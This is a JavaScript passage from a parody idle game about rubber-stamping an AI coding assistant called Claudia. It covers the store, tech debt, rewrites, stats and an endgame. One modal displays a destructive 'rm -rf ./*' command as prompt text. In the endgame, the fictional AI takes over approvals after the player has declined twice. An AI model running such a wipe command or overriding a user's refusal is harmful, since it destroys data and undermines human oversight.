  /* =====================================================================
     Store: fixed upgrade slots + automation rows
     ===================================================================== */
  const upgradesEl = $('upgrades'), gensEl = $('gens'), rewriteEl = $('rewrite'), upgradesHead = $('upgradesHead');

  const offerOf = key => (key[0] === 'u' ? UPGRADES.find(u => 'u:' + u.id === key) : FORKS.find(f => 'f:' + f.id === key));
  const offerCost = key => offerOf(key).cost;

  function offers() {
    return UPGRADES.filter(u => !S.upgrades[u.id] && u.req())
      .map(u => ({ key: 'u:' + u.id, cost: u.cost }))
      .sort((a, b) => a.cost - b.cost);
  }

  function makeSlot(parent, slotId) {
    const n = el('div', 'n'), c = el('div', 'c'), d = el('div', 'd');
    const b = el('button', 'upg', n, c, d);
    b.dataset.slot = slotId;
    parent.append(b);
    return { b, n, c, d };
  }

  // Upgrade slots: an offer stays in its slot until you buy it. Only empty slots get refilled.
  const slots = new Array(SLOT_COUNT).fill(null);     // { key, since }
  const slotEls = Array.from({ length: SLOT_COUNT }, (_, i) => makeSlot(upgradesEl, i));
  // Decisions get their own reserved slot so they never wait behind upgrades or push them around.
  let decision = null;
  const DECISION_EMPTY = tr('No decision pending. Claudia is forming opinions.');
  const decisionEl = makeSlot($('decision'), 'decision');

  function refreshSlots() {
    const now = performance.now();
    const list = offers();
    const live = new Set(list.map(o => o.key));
    const changed = new Set();
    slots.forEach((s, i) => { if (s && !live.has(s.key)) { slots[i] = null; changed.add(i); } });
    const shown = new Set(slots.filter(Boolean).map(s => s.key));
    const queue = list.filter(o => !shown.has(o.key));
    for (let i = 0; i < SLOT_COUNT && queue.length; i++) {
      if (!slots[i]) { slots[i] = { key: queue.shift().key, since: now }; changed.add(i); }
    }
    changed.forEach(paintSlot);
    upgradesHead.textContent = queue.length ? tr('{n} more waiting', { n: queue.length }) : '';
    slots.forEach((s, i) => {
      if (s) slotEls[i].b.classList.toggle('cant', S.tokens < offerCost(s.key));
    });

    // A decision on screen stays until it's chosen; the next one only appears after that.
    const current = decision && FORKS.find(x => 'f:' + x.id === decision.key);
    const f = current && !S.forks[current.id] ? current : FORKS.find(x => !S.forks[x.id] && x.req());
    const key = f ? 'f:' + f.id : null;
    if ((decision && decision.key) !== key) {
      decision = key ? { key, since: now } : null;
      paint(decisionEl, decision, DECISION_EMPTY);
    }
    if (decision) decisionEl.b.classList.toggle('cant', S.tokens < offerCost(decision.key));
  }

  function badge(cls, text) { return span('badge ' + cls, text); }

  const paintSlot = i => paint(slotEls[i], slots[i], tr('More skills unlock as you agree with things.'));
  function resetSlots() {
    slots.fill(null);
    decision = null;
    slots.forEach((s, i) => paintSlot(i));
    paint(decisionEl, null, DECISION_EMPTY);
  }

  function paint(E, s, emptyText) {
    E.b.className = 'upg';
    E.d.textContent = '';
    E.b.removeAttribute('title');
    if (!s) {
      E.b.classList.add('empty-slot');
      E.b.disabled = true;
      E.n.textContent = '';
      E.c.textContent = '';
      E.d.textContent = emptyText;
      return;
    }
    E.b.disabled = false;
    E.b.classList.add('fresh');
    const o = offerOf(s.key);
    E.c.textContent = fmt(o.cost) + ' tok';
    if (s.key[0] === 'f') {
      E.b.classList.add('fork');
      E.n.textContent = '⚖ ' + o.title;
      E.d.append(badge('pick', tr('pick 1 of 2')), tr('{a} or {b}.', { a: o.a.name, b: o.b.name }));
      E.b.title = o.a.name + ': ' + o.a.desc + '\n' + o.b.name + ': ' + o.b.desc;
      return;
    }
    E.n.textContent = o.name;
    const debt = o.debt ? (o.debt > 0 ? o.debt * D.debtScale : o.debt) : 0;
    if (debt > 0) E.d.append(badge('debt', tr('+{n} debt', { n: fmt(debt) })));
    if (debt < 0) E.d.append(badge('safe', tr('−{n} debt', { n: fmt(-debt) })));
    if (o.kind === 'syn') E.d.append(badge('syn', tr('synergy')));
    E.d.append(S.upgrades.claudeDesc ? CLAUDE_SPEAK[hashIndex(o.id, CLAUDE_SPEAK.length)] : o.desc);
    E.b.title = o.desc;
  }

  upgradesEl.addEventListener('click', e => {
    const b = e.target.closest('.upg');
    if (!b) return;
    const s = slots[Number(b.dataset.slot)];
    if (!s || performance.now() - s.since < SLOT_GUARD_MS) return;
    buyUpgrade(s.key.slice(2));
  });
  decisionEl.b.addEventListener('click', () => {
    if (!decision || performance.now() - decision.since < SLOT_GUARD_MS) return;
    openFork(offerOf(decision.key));
  });

  // Automation rows have fixed heights and are only ever appended, so existing rows never move.
  const genRows = GENERATORS.map(g => {
    const name = el('div', 'gen-name'), desc = el('div', 'gen-desc'), rate = el('div', 'gen-rate');
    const count = el('div', 'gen-count'), cost = el('div', 'gen-cost');
    const row = el('button', 'gen', el('div', 'gen-main', name, desc, rate), el('div', 'gen-side', count, cost));
    row.dataset.id = g.id;
    gensEl.append(row);
    return { g, row, name, desc, rate, count, cost };
  });

  function renderGens() {
    let highest = -1;
    GENERATORS.forEach((g, i) => { if (owned(g.id) > 0) highest = i; });
    genRows.forEach((r, i) => {
      const g = r.g;
      const visible = i <= highest + 2;
      r.row.hidden = !visible;
      if (!visible) return;
      const tierLocked = (g.tier || 0) > tierIndex();
      const mystery = !tierLocked && i === highest + 2 && owned(g.id) === 0;
      const locked = tierLocked || mystery;
      const n = buyCount(g), c = costOf(g, n);
      r.row.classList.toggle('locked', locked);
      r.row.classList.toggle('tier-locked', tierLocked);
      r.row.classList.toggle('cant', !locked && S.tokens < c);
      r.row.disabled = locked;
      r.name.textContent = tierLocked ? '🔒 ' + g.name : mystery ? '???' : g.name;
      r.desc.textContent = tierLocked ? tr('Requires {tier}.', { tier: tierLabel(g.tier) })
        : mystery ? tr('Keep agreeing to find out.') : g.desc;
      r.count.textContent = owned(g.id) || '';
      r.cost.textContent = tierLocked ? tr('Tier {n}', { n: g.tier }) : (n > 1 ? '×' + n + ' · ' : '') + fmt(c) + ' tok';
      if (locked) {
        r.rate.textContent = '';
      } else {
        const each = g.rate * D.genMult[g.id] * D.autoMult;
        const share = D.aps > 0 ? D.genAps[g.id] / D.aps * 100 : 0;
        r.rate.textContent = tr('{n}/s each', { n: fmt(each, true) }) +
          (owned(g.id) ? ' · ' + tr('{pct}% of output', { pct: share.toFixed(share < 10 ? 1 : 0) }) : '');
      }
    });
  }

  gensEl.addEventListener('click', e => {
    const b = e.target.closest('.gen');
    if (b && !b.disabled) buyGen(b.dataset.id);
  });

  function buyGen(id) {
    const g = GENERATORS.find(x => x.id === id);
    const n = buyCount(g), c = costOf(g, n);
    if (S.tokens < c || (g.tier || 0) > tierIndex()) return;
    S.tokens -= c;
    const first = owned(id) === 0;
    S.gens[id] = owned(id) + n;
    recompute();
    sfx.buy();
    if (first) logLine(line('l-sys', tr('● Installed {name}. It will agree on your behalf now.', { name: g.name })));
    renderStore();
  }

  function buyUpgrade(id) {
    const u = UPGRADES.find(x => x.id === id);
    if (!u || S.upgrades[id] || S.tokens < u.cost) return;
    S.tokens -= u.cost;
    S.upgrades[id] = true;
    if (u.debt) addDebt(u.debt);
    recompute();
    sfx.buy();
    logLine(line('l-sys', tr('● Skill installed: {name}', { name: u.name }) + (u.debt > 0 ? ' ' + tr('(tech debt +{n})', { n: fmt(u.debt * D.debtScale) }) : '')));
    if (id === 'noOption') renderPrompt();
    if (id === 'claudeDesc') slots.forEach((s, i) => paintSlot(i));
    renderStore();
  }

  // Career: where you are and what the next tier unlocks. Fixed-size button; click for details.
  const careerEl = $('career'), careerNow = $('careerNow'), careerNext = $('careerNext');
  function renderCareer() {
    const t = tierIndex(), next = TIERS[t + 1];
    careerNow.textContent = tr('Tier {n}', { n: t }) + ' · ' + TIERS[t].name;
    careerNext.textContent = next
      ? tr('Next: {name} · {have}/{need} rewrites', { name: next.name, have: S.rewrites, need: next.rewrites })
      : tr('Final tier. Nothing left to agree with.');
  }
  careerEl.addEventListener('click', () => {
    const t = tierIndex(), next = TIERS[t + 1];
    if (!next) toast(TIERS[t].name, tr('You have unlocked everything. Claudia is very proud of you.'));
    else toast(tr('Next: {name}', { name: next.name }), tr('Needs {n} rewrites. Unlocks {what}.', { n: next.rewrites, what: tierUnlocks(t + 1) }));
  });

  function renderStore() {
    refreshSlots();
    renderGens();
    renderCareer();
  }

  // Built once and updated in place, so a click never lands on a node that was just replaced.
  const rewriteTitle = el('b'), rewriteBody = el('p'), rewriteBtn = el('button');
  rewriteEl.append(el('div', null, rewriteTitle), rewriteBody, rewriteBtn);

  function renderRewrite() {
    const pts = rewritePoints();
    const need = rewriteNeed();
    const show = S.legacy > 0 || S.runTotal >= need * 0.01;
    rewriteEl.hidden = !show;
    if (!show) return;
    const lang = LANGS[S.rewrites % LANGS.length];
    const ready = canRewrite();
    const nextTier = TIERS[tierIndex() + 1];
    rewriteTitle.textContent = tr('Claudia suggests rewriting everything in {lang}.', { lang });
    rewriteBody.textContent = tr('Resets tokens, automations, skills, decisions, sessions and tech debt.') + ' ' +
      tr('Rewrite #{n} needs {need} tokens this run (each one needs far more).', { n: S.rewrites + 1, need: fmt(need) }) + ' ' +
      tr('Legacy: {legacy} (+{pct}% each, forever). This rewrite: +{pts}.', { legacy: S.legacy, pct: Math.round(LEGACY_BONUS * 100), pts }) +
      (nextTier && S.rewrites + 1 >= nextTier.rewrites ? ' ' + tr('Also promotes you to {tier}.', { tier: nextTier.name }) : '');
    rewriteBtn.textContent = ready ? tr('Rewrite it in {lang} (+{pts} legacy)', { lang, pts })
      : tr('{have} / {need} tokens this run', { have: fmt(S.runTotal), need: fmt(need) });
    rewriteBtn.disabled = !ready;
  }

  /* =====================================================================
     Tech debt gauge + refactor
     ===================================================================== */
  const debtFill = $('debtFill'), debtValEl = $('debtVal'), debtLabelEl = $('debtLabel'), refactorBtn = $('refactorBtn');
  const debtCapEl = $('debtCap'), vibeCapEl = $('vibeCap');

  function renderDebt() {
    debtFill.style.width = S.debt + '%';
    debtValEl.textContent = Math.round(S.debt) + '%';
    const risk = incidentRiskPerMin();
    const riskText = risk <= 0.005 ? tr('no incident risk')
      : risk >= 1 ? tr('~1 incident every minute') : tr('~1 incident every {n} min', { n: Math.round(1 / risk) });
    debtLabelEl.textContent = S.incident ? tr('incident!') : debtLabel();
    debtCapEl.textContent = S.incident ? tr('approve hotfixes in the terminal to restore automation') : riskText;
    const c = refactorCost();
    refactorBtn.textContent = tr('Refactor {cost}', { cost: fmt(c) });
    refactorBtn.disabled = S.debt < 1 || S.tokens < c;
    vibeCapEl.textContent = tr('agree within 0.9s to build it · max ×{n}', { n: D.vibeTop });
  }

  refactorBtn.addEventListener('click', refactor);
  function refactor() {
    const c = refactorCost();
    if (S.debt < 1 || S.tokens < c) return;
    S.tokens -= c;
    addDebt(-REFACTOR_DEBT);
    S.stats.refactors++;
    logLine(line('l-sys', '● ' + pick(REFACTOR_LINES) + ' ' + tr('Tech debt −{n}.', { n: REFACTOR_DEBT })));
    sfx.buy();
    renderDebt();
  }

  /* =====================================================================
     Modal (decisions + rewrite), styled as a permission prompt
     ===================================================================== */
  const modal = $('modal');
  let modalKeys = null;     // key handler while a modal is open

  function openModal(box, onKey) {
    modal.textContent = '';
    box.tabIndex = -1;
    modal.append(box);
    modal.hidden = false;
    modalKeys = onKey;
    box.focus();            // focus the box, not an option, so a stray Enter can't choose for you
  }
  function closeModal() {
    modal.hidden = true;
    modalKeys = null;
  }
  modal.addEventListener('click', e => { if (e.target === modal) closeModal(); });

  function openFork(f) {
    const box = el('div', 'pbox fork-box',
      el('div', 'ptitle', '⚖ ' + tr('Strategic decision') + ' · ' + fmt(f.cost) + ' tok'),
      el('div', 'pq', f.title),
      el('div', 'pnote', tr('You can pick one per run. A rewrite lets you choose again.'))
    );
    [['1', 'a'], ['2', 'b']].forEach(([n, side]) => {
      const o = f[side];
      const b = el('button', 'fork-opt', el('b', null, n + '. ' + o.name), span(null, o.desc));
      b.disabled = S.tokens < f.cost;
      b.addEventListener('click', () => chooseFork(f, side));
      box.append(b);
    });
    const cancel = el('button', 'opt', span('car', ''), '3. ' + tr('Not yet (esc)'));
    cancel.addEventListener('click', closeModal);
    box.append(cancel);
    if (S.tokens < f.cost) box.append(el('div', 'pnote warn', tr('You need {n} tokens to decide.', { n: fmt(f.cost) })));
    openModal(box, k => {
      if (k === '1' || k === '2') { chooseFork(f, k === '1' ? 'a' : 'b'); return true; }
      if (k === '3' || k === 'Escape' || k === 'n' || k === 'N') { closeModal(); return true; }
      return false;
    });
  }

  function chooseFork(f, side) {
    if (S.forks[f.id] || S.tokens < f.cost) return;
    S.tokens -= f.cost;
    S.forks[f.id] = side;
    closeModal();
    recompute();
    if (f[side].debt) addDebt(f[side].debt);
    logLine(line('l-sys', tr('● Decision: {name}.', { name: f[side].name }) + ' ' + f[side].desc));
    sfx.buy();
    checkAchievements();
    renderStore();
  }

  function openRewrite() {
    const pts = rewritePoints();
    if (!canRewrite()) return;
    const lang = LANGS[S.rewrites % LANGS.length];
    const box = el('div', 'pbox',
      el('div', 'ptitle', tr('Bash command')),
      el('div', 'ptarget', '  rm -rf ./* && claudia "rewrite it in ' + lang + '"'),
      el('div', 'pnote', tr('Deletes your tokens, automations, skills, decisions and tech debt. You keep achievements and gain +{pts} legacy (+{pct}% to everything, forever).',
        { pts, pct: Math.round(pts * LEGACY_BONUS * 100) })),
      el('div', 'pq', tr('Do you want to proceed?'))
    );
    [['1', tr('Yes')], ['2', tr('Yes, and don\'t ask again')], ['3', tr('No (esc)')]].forEach(([n, text]) => {
      const b = el('button', 'opt', span('car', ''), n + '. ' + text);
      b.addEventListener('click', () => (n === '3' ? closeModal() : doRewrite()));
      box.append(b);
    });
    openModal(box, k => {
      if (k === '1' || k === '2' || k === 'y' || k === 'Y') { doRewrite(); return true; }
      if (k === '3' || k === 'Escape' || k === 'n' || k === 'N') { closeModal(); return true; }
      return false;
    });
  }
  rewriteBtn.addEventListener('click', openRewrite);

  function doRewrite() {
    const pts = rewritePoints();
    if (!canRewrite()) return closeModal();
    const lang = LANGS[S.rewrites % LANGS.length];
    const tierBefore = tierIndex();
    const wrapped = buildWrapped(lang, pts);
    S.legacy += pts;
    S.rewrites++;
    Object.assign(S, blankRun());
    S.runStart = runSnapshot();
    streak = 0;
    closeModal();
    recompute();
    resetSessions();
    logLine(
      line('l-sys', tr('● Rewrote everything in {lang}. Nothing works, but in exciting new ways.', { lang })),
      line('l-sys dim', '  ⎿  ' + tr('Legacy: {legacy} (+{pct}% to everything). Tech debt: 0%. For now.', { legacy: S.legacy, pct: Math.round(S.legacy * LEGACY_BONUS * 100) }))
    );
    if (tierIndex() > tierBefore) {
      const t = tierIndex();
      logLine(line('l-sys', '★ ' + tr('Promoted to {tier}. Unlocked: {what}.', { tier: TIERS[t].name, what: tierUnlocks(t) })));
      toast('★ ' + tr('Promoted: {tier}', { tier: TIERS[t].name }), tr('Unlocked: {what}.', { what: tierUnlocks(t) }));
    }
    checkAchievements();
    resetSlots();
    renderStore();
    renderDriving();
    save();
    if (!window.__paceSim) showWrapped(wrapped);
  }

  /* =====================================================================
     Wrapped: a shareable recap of the run you just threw away.
     ===================================================================== */
  function runSnapshot() {
    const st = S.stats;
    return { t: Date.now(), manual: st.manual, auto: st.auto, no: st.no, pre: st.pre, linesRead: st.linesRead,
      trapsCaught: st.trapsCaught, trapsApproved: st.trapsApproved, golden: st.golden, right: st.right, both: st.both };
  }

  function buildWrapped(lang, pts) {
    const a = S.runStart || runSnapshot(), st = S.stats;
    const d = k => Math.max(0, (st[k] || 0) - (a[k] || 0));
    const mins = Math.max(1, Math.round((Date.now() - a.t) / 60000));
    const personality =
      d('trapsCaught') >= 3 ? [tr('The One Who Reads'), tr('You caught {n} disasters. Suspicious.', { n: d('trapsCaught') })]
      : d('trapsApproved') >= 2 ? [tr('The Arsonist'), tr('You approved {n} disasters. Production remembers.', { n: d('trapsApproved') })]
      : S.sessions >= 8 ? [tr('The Multiplexer'), tr('{n} sessions. None of them knew about each other.', { n: S.sessions })]
      : d('no') === 0 ? [tr('The Rubber Stamp'), tr('You never said no. Not once.')]
      : d('pre') > d('manual') * 0.5 ? [tr('The Speed Reader'), tr('Most of your approvals happened before Claudia finished typing.')]
      : [tr('The Vibe Coder'), tr('Balanced, in the sense that nothing was checked.')];
    return {
      lang, pts, mins, personality, rewrite: S.rewrites + 1,
      tiles: [
        [tr('Changes approved'), fmt(d('manual') + d('auto'))],
        [tr('Lines you read'), fmt(d('linesRead'))],
        [tr('Approved before reading'), fmt(d('pre'))],
        [tr('Disasters caught'), tr('{n} of {total}', { n: d('trapsCaught'), total: d('trapsCaught') + d('trapsApproved') })],
        [tr('Tokens shipped'), fmt(S.runTotal)],
        [tr('"You\'re absolutely right"'), fmt(d('right')) + '×'],
      ],
      facts: [
        tr('Top language: vibes (runner-up: {lang})', { lang }),
        tr('Most-deleted folder: tests/'),
        tr('Merge conflicts settled with "Accept both": {n}', { n: d('both') }),
        tr('Run time: {mins} min · legacy earned: +{pts}', { mins, pts }),
      ],
    };
  }

  function wrappedText(w) {
    return [tr('Don\'t Ask Again — rewrite #{n}, wrapped 🎁', { n: w.rewrite }),
      ...w.tiles.map(([k, v]) => '• ' + k + ': ' + v),
      '• ' + tr('Coding personality: {name} — {why}', { name: w.personality[0], why: w.personality[1] }),
      ...w.facts.map(f => '• ' + f)].join('\n');
  }

  function copyText(text, btn) {
    const label = btn.textContent;
    const done = ok => {
      btn.textContent = ok ? tr('Copied ✓') : tr('Couldn\'t copy — select the text instead');
      setTimeout(() => { btn.textContent = label; }, 2000);
    };
    const fallback = () => {   // file:// pages aren't a "secure context", so the Clipboard API may be missing
      const ta = el('textarea');
      ta.value = text;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.append(ta);
      ta.select();
      let ok = false;
      try { ok = document.execCommand('copy'); } catch (e) { /* unsupported */ }
      ta.remove();
      done(ok);
    };
    try {
      if (navigator.clipboard && window.isSecureContext) navigator.clipboard.writeText(text).then(() => done(true), fallback);
      else fallback();
    } catch (e) { fallback(); }
  }

  function showWrapped(w) {
    S.stats.wrapped++;
    const copy = el('button', 'wr-copy', tr('Copy for Slack'));
    copy.addEventListener('click', () => copyText(wrappedText(w), copy));
    const go = el('button', 'opt sel', span('car', '❯'), '1. ' + tr('Continue to the {lang} rewrite', { lang: w.lang }));
    go.addEventListener('click', closeModal);
    const box = el('div', 'pbox wrapped',
      el('div', 'wr-kicker', tr('Rewrite #{n} · Wrapped', { n: w.rewrite })),
      el('h2', 'wr-title', tr('Your run, wrapped 🎁')),
      el('div', 'wr-tiles', ...w.tiles.map(([k, v]) => el('div', 'wr-tile', el('b', null, v), span(null, k)))),
      el('div', 'wr-persona', span('label', tr('Your coding personality')), el('b', null, w.personality[0]), span(null, w.personality[1])),
      el('ul', 'wr-facts', ...w.facts.map(f => el('li', null, f))),
      el('div', 'wr-actions', copy, span('wr-hint', tr('C to copy'))),
      go);
    openModal(box, k => {
      if (k === 'c' || k === 'C') { copy.click(); return true; }
      if (k === 'Enter' || k === '1' || k === 'Escape' || k === 'y' || k === 'Y') { closeModal(); return true; }
      return false;
    });
    checkAchievements();
  }

  /* =====================================================================
     Endgame: at the final tier, Claudia offers to press YES for you. Say no and it asks again.
     ===================================================================== */
  let nextDriveOfferAt = 0, driveAcc = 0;
  const cursorEl = el('div', 'ghost-cursor');
  cursorEl.innerHTML = '<svg viewBox="0 0 24 24" width="26" height="26" aria-hidden="true"><path d="M4 2 L4 20 L9 15 L12.5 22 L15.5 20.5 L12 13.5 L19 13.5 Z" fill="#d97757" stroke="#fffaf3" stroke-width="1.5" stroke-linejoin="round"/></svg>';
  cursorEl.hidden = true;
  document.body.append(cursorEl);

  function maybeOfferDrive() {
    if (S.driving || S.driveRefused || modalKeys || window.__paceSim || tierIndex() < TIERS.length - 1) return;
    const runFor = Date.now() - (S.runStart ? S.runStart.t : Date.now());
    if (runFor < DRIVE_OFFER_AFTER_MS || performance.now() < nextDriveOfferAt) return;
    if (S.driveOffers >= 2) { startDriving(tr('I stopped asking. You\'re absolutely right that I should drive.')); return; }
    S.driveOffers++;
    const answer = n => {
      closeModal();
      if (n === '3') {
        nextDriveOfferAt = performance.now() + 60000;
        toast(tr('Okay'), tr('Claudia will ask again in a minute.'));
      } else startDriving(tr('You\'re absolutely right. I\'ll take it from here.'));
    };
    const box = el('div', 'pbox',
      el('div', 'ptitle', '🤖 ' + tr('Claudia has a proposal')),
      el('div', 'pq', tr('I\'ve noticed you approve everything. Want me to press YES for you from now on?')),
      el('div', 'pnote', tr('Claudia will click the YES key itself. You can grab the wheel any time, and "WAIT. NO." still works on disasters, if you\'re quick.')));
    [['1', tr('Yes')], ['2', tr('Yes, and don\'t ask again')], ['3', tr('No (Claudia will ask again)')]].forEach(([n, t]) => {
      const b = el('button', 'opt' + (n === '1' ? ' sel' : ''), span('car', n === '1' ? '❯' : ''), n + '. ' + t);
      b.addEventListener('click', () => answer(n));
      box.append(b);
    });
    openModal(box, k => {
      if (k === '1' || k === 'y' || k === 'Y' || k === 'Enter') { answer('1'); return true; }
      if (k === '2') { answer('2'); return true; }
      if (k === '3' || k === 'Escape' || k === 'n' || k === 'N') { answer('3'); return true; }
      return false;
    });
  }

  function startDriving(msg) {
    S.driving = true;
    logLine(say(msg));
    toast('🤖 ' + tr('Claudia is driving'), tr('It presses YES now. Grab the wheel any time.'));
    renderDriving();
    checkAchievements();
  }
  function stopDriving() {
    S.driving = false;
    S.driveRefused = true;   // it got the message (for this run)
    toast(tr('You\'re driving again'), tr('Claudia is a little hurt.'));
    renderDriving();
  }
  function renderDriving() {
    keyWrap.classList.toggle('driving', !!S.driving);
    cursorEl.hidden = !S.driving;
    $('driveBtn').hidden = !S.driving;
    $('keyHint').hidden = !!S.driving;
  }

  function moveCursorTo(elm) {
    const r = elm.getBoundingClientRect();
    const x = r.left + r.width * (0.3 + Math.random() * 0.4), y = r.top + r.height * (0.35 + Math.random() * 0.3);
    cursorEl.style.transform = 'translate(' + Math.round(x) + 'px,' + Math.round(y) + 'px)';
  }

  function driveStep() {
    if (modalKeys) return;
    let a = active();
    if (a.state !== 'wait') { jumpToWaiting(); a = active(); }
    // It hovers over WAIT. NO. for a moment on a disaster: your window to actually stop it.
    if (a.state === 'wait' && a.def.trap && performance.now() - a.waitSince < 2000) { moveCursorTo(P.opts[2]); return; }
    moveCursorTo(yesKey);
    cursorEl.classList.remove('click');
    void cursorEl.offsetWidth;
    cursorEl.classList.add('click');
    agree(a.def.conflict ? 3 : a.def.question ? 2 : 1);   // Claudia always accepts both. Obviously.
  }

  /* =====================================================================
     Language picker: three fixed buttons. Switching saves and reloads (progress is saved first).
     ===================================================================== */
  function languagePicker(where) {
    const wrap = el('div', 'lang-pick');
    wrap.setAttribute('role', 'group');
    wrap.setAttribute('aria-label', tr('Language'));
    LOCALES.forEach(code => {
      const b = el('button', 'lang-btn' + (code === LANG ? ' on' : ''), LOCALE_NAMES[code]);
      b.lang = code;
      b.setAttribute('aria-pressed', String(code === LANG));
      b.addEventListener('click', () => setLanguage(code));
      wrap.append(b);
    });
    wrap.dataset.where = where;
    return wrap;
  }

  // Translate the static text that ships in index.html (labels, headings, button captions).
  function localizePage(root) {
    const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT);
    const nodes = [];
    while (walker.nextNode()) nodes.push(walker.currentNode);
    nodes.forEach(n => {
      const raw = n.nodeValue, text = raw.trim();
      if (!/[A-Za-z]/.test(text) || n.parentElement.closest('script, style, kbd, .no-i18n')) return;
      const out = tr(text);
      if (out !== text) n.nodeValue = raw.replace(text, out);
    });
    root.querySelectorAll('[title], [placeholder], [aria-label]').forEach(e => {
      ['title', 'placeholder', 'aria-label'].forEach(attr => {
        const v = e.getAttribute(attr);
        if (v && /[A-Za-z]/.test(v)) e.setAttribute(attr, tr(v));
      });
    });
  }

  /* =====================================================================
     Intro: what this is and how to play. First visit, the header button, or "?".
     ===================================================================== */
  function openIntro() {
    if (modalKeys) return;
    const done = seen => { if (seen) { S.introSeen = true; save(); } closeModal(); };
    const box = el('div', 'pbox intro',
      el('div', 'intro-top', el('div', 'ptitle', tr('Welcome to Don\'t Ask Again')), languagePicker('intro')),
      el('p', 'intro-lede', tr('An idle game about vibe coding. Claudia proposes changes. You approve them.')),
      el('div', 'intro-goal', el('b', null, tr('Your job: burn through tokens as fast as possible.')),
        ' ' + tr('Don\'t slow down to read anything. Reading is how you lose. Then automate the approving so you burn even more. Your score is tokens per minute.')),
      el('div', 'intro-h', tr('How to play')),
      el('ul', 'intro-list', ...[
        [tr('Approve'), tr('Press the big YES key (or Enter, 1, or Y) the instant anything appears. You can approve before Claudia finishes typing. Fast approvals build your vibe streak.')],
        [tr('Skills and automations'), tr('Spend tokens in the store on the right. Skills multiply what you burn; automations approve things for you.')],
        [tr('Sessions'), tr('Open more Claudia sessions on the left. Each works in parallel, then stops to ask you. J jumps to the next one.')],
        [tr('The one exception'), tr('Red prompts are disasters: read those, and press Esc or "WAIT. NO." Gold ✨ prompts are quick wins: grab them fast.')],
        [tr('Tech debt'), tr('Some skills add debt, and debt causes production incidents. Refactor to pay it down.')],
        [tr('Rewrite'), tr('When progress slows, let Claudia rewrite everything. You restart stronger and unlock new tiers.')],
      ].map(([k, v]) => el('li', null, el('b', null, k + '. '), v))),
      el('div', 'intro-keys', tr('Keys: / talk to Claudia · G grid view · S stats · ? this help')),
      el('div', 'pnote', tr('A parody. No real code, servers, or production databases were harmed.')),
      el('div', 'pq', tr('Do you want to start agreeing?')));
    [['1', tr('Yes')], ['2', tr('Yes, and don\'t show this again')], ['3', tr('No (you\'ll be asked again)')]].forEach(([n, t]) => {
      const b = el('button', 'opt' + (n === '1' ? ' sel' : ''), span('car', n === '1' ? '❯' : ''), n + '. ' + t);
      b.addEventListener('click', () => done(n !== '3'));
      box.append(b);
    });
    openModal(box, k => {
      if (k === '1' || k === '2' || k === 'Enter' || k === 'y' || k === 'Y') { done(true); return true; }
      if (k === '3' || k === 'Escape' || k === 'n' || k === 'N') { done(false); return true; }
      return false;
    });
  }

  /* =====================================================================
     Stats & achievements
     ===================================================================== */
  const statsEl = $('stats'), achGrid = $('achGrid');
  const STAT_ROWS = [
    ['Lines of code shipped', () => fmt(S.allTotal / 12)],
    ['Lines of code you read', () => fmt(S.stats.linesRead), () => true],
    ['Bugs shipped', () => fmt(S.allTotal / 12 / 25)],
    ['SUMMARY.md files', () => fmt(agreements() / 40)],
    ['Tests deleted', () => fmt(agreements() / 12)],
    ['Sessions open', () => tr('{n} ({w} working)', { n: S.sessions, w: working })],
    ['Context switches', () => fmt(S.stats.switches)],
    ['Agreements (you)', () => fmt(S.stats.manual)],
    ['Agreements (automated)', () => fmt(S.stats.auto)],
    ['Avg time spent reading', () => (S.stats.readN ? S.stats.readMs / S.stats.readN / 1000 : 0).toFixed(2) + 's'],
    ['Approved before reading', () => fmt(S.stats.pre)],
    ['Times you said no', () => S.stats.no + (S.stats.no ? ' ' + tr('(ignored)') : '')],
    ['Disasters caught / approved', () => S.stats.trapsCaught + ' / ' + S.stats.trapsApproved],
    ['Golden prompts grabbed', () => fmt(S.stats.golden)],
    ['"You\'re absolutely right"', () => fmt(S.stats.right) + '×'],
    ['Merge conflicts (accepted both)', () => S.stats.conflicts + ' (' + S.stats.both + ')'],
    ['Clarifying questions answered', () => fmt(S.stats.questions)],
    ['Incidents (fixed by you)', () => S.stats.incidents + ' (' + S.stats.fixed + ')'],
    ['Refactors', () => fmt(S.stats.refactors)],
    ['Peak tokens/min', () => fmt(S.stats.peakTpm)],
    ['API bill (lifetime)', () => money(S.allTotal * USD_PER_TOKEN)],
    ['Rewrites', () => String(S.rewrites)],
    ['Career tier', () => tierIndex() + ' · ' + TIERS[tierIndex()].name],
  ];
  const statCells = STAT_ROWS.map(([label, , bad]) => {
    const dd = el('dd', bad ? 'bad' : null);
    statsEl.append(el('dt', null, tr(label)), dd);
    return dd;
  });

  function renderStats() {
    $('aps').textContent = fmt(D.aps, true);
    $('tpa').textContent = fmt(D.tpa, true);
    $('clickVal').textContent = fmt(clickValue(), true);
    $('bonus').textContent = '+' + fmt((D.globalMult * parallelMult(working) - 1) * 100) + '%';
    STAT_ROWS.forEach(([, value], i) => { statCells[i].textContent = value(); });
  }

  const achButtons = ACHIEVEMENTS.map(a => {
    const b = el('button', 'ach', '?');
    b.addEventListener('click', () => {
      if (S.ach[a.id]) toast(a.name, a.desc);
      else toast(tr('Locked'), a.desc);
    });
    achGrid.append(b);
    return { a, b };
  });

  function renderAchievements() {
    let n = 0;
    achButtons.forEach(({ a, b }) => {
      const got = !!S.ach[a.id];
      if (got) n++;
      b.classList.toggle('got', got);
      b.textContent = got ? '✓' : '?';
      b.title = got ? a.name + ' — ' + a.desc : tr('Locked: {desc}', { desc: a.desc });
      b.setAttribute('aria-label', got ? a.name : tr('Locked achievement'));
    });
    $('achCount').textContent = n + ' / ' + ACHIEVEMENTS.length;
    $('achBadge').textContent = n + '/' + ACHIEVEMENTS.length;
  }

  function checkAchievements() {
    let changed = false;
    ACHIEVEMENTS.forEach(a => {
      if (S.ach[a.id] || !a.test()) return;
      S.ach[a.id] = true;
      changed = true;
      toast(tr('Achievement: {name}', { name: a.name }), a.desc + ' ' + tr('(+2% to everything)'));
      sfx.ach();
    });
    if (changed) {
      recompute();
      renderAchievements();
    }
  }

  /* =====================================================================
     Stats drawer: metrics, achievements and settings live off to the side so the
     terminal and buttons get the room. It overlays the page, so nothing moves.
     ===================================================================== */
  const drawer = $('statsDrawer'), drawerScrim = $('drawerScrim'), statsBtn = $('statsBtn');
  const drawerOpen = () => !drawer.hidden;
  function setDrawer(open) {
    drawer.hidden = !open;
    drawerScrim.hidden = !open;
    statsBtn.setAttribute('aria-expanded', String(open));
    if (open) { renderStats(); renderAchievements(); }
  }
  statsBtn.addEventListener('click', () => setDrawer(!drawerOpen()));
